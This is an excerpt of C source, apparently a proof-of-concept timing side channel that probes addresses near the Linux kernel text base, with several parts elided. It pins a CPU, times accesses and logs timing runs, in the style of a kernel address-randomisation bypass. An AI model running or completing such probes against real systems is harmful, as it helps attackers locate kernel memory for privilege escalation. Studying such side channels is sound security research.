...
#define FAKES 10
#define START (0xffffffff81000000ull - STEP * FAKES)
...
int main(int argc, char **argv) {
  lwarn("This PoC requires kvm and tweaking depending on CPU");
  pin_cpu(0, 0);
      ...
      for (int ti = 0; ti < ARRAY_LEN(times); ++ti) {
        if (times[ti] != times[start] || ti == ARRAY_LEN(times) - 1) {
          ldebug("addr %llx[%04lx] time %zu", addrs[start],
                 (addrs[ti] - addrs[start]) / STEP, times[start]);
          start = ti;
        }
      }
#endif
